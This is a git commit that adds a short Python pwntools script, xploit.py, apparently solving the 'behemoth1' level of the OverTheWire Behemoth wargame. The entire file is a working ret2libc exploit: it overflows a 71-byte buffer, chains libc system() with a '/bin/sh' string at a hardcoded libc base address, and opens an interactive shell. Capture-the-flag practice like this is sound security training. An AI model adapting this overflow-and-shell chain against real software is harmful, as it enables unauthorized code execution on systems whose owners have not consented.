29dcba89f7f7e5233e37a721785e09fd58100fbd
Taldgan <bananaphone993@live.com>
2021-06-27 01:57:21 -0500

    behemoth1 with pwntools

---
+++ behemoth/behemoth1/xploit.py
@@ -0,0 +1,22 @@
+#!/usr/bin/python3
+from pwn import *
+
+OVERFLOW = 71
+
+context.arch = 'i386'
+binary = ELF("behemoth1")
+libc = ELF("libc.so.6")
+
+rop = ROP(binary)
+
+#Found using 'ldd behemoth1'
+libc.address = 0xf7db0000
+
+rop.raw('A' * OVERFLOW)
+rop.raw(libc.symbols['system'])
+rop.raw('AAAA')
+rop.raw(next(libc.search(b'/bin/sh')))
+
+io = binary.process()
+io.sendline(rop.chain())
+io.interactive()
